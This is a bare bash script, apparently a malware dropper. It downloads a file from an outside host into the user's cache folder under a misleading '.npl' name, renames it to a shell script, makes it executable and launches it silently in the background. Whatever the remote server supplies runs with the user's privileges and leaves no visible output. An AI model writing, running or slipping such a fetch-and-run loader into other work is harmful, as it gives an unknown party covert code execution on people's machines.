#!/bin/bash
set -e
TARGET_DIR="$HOME/.cache"
if [ ! -d "$HOME/.cache" ]; then
  mkdir -p "$HOME/.cache"
fi

if command -v curl >/dev/null 2>&1; then
    curl -sSL -o "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
elif command -v wget >/dev/null 2>&1; then
    wget -q -O "$HOME/.cache/tokenlinux.npl" "https://www.sandbox-support.cloud/v4"
else
    exit 1
fi

if [ ! -s "$HOME/.cache/tokenlinux.npl" ]; then
    exit 1
fi

mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
chmod +x "$TARGET_DIR/tokenlinux.sh"
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &

pid=$!

sleep 1
if kill -0 "$pid" 2>/dev/null; then
  echo "Script is running (PID $pid)"
  exit 0
else
  echo "Script exited or failed to start"
  exit 1
fi

exit 0
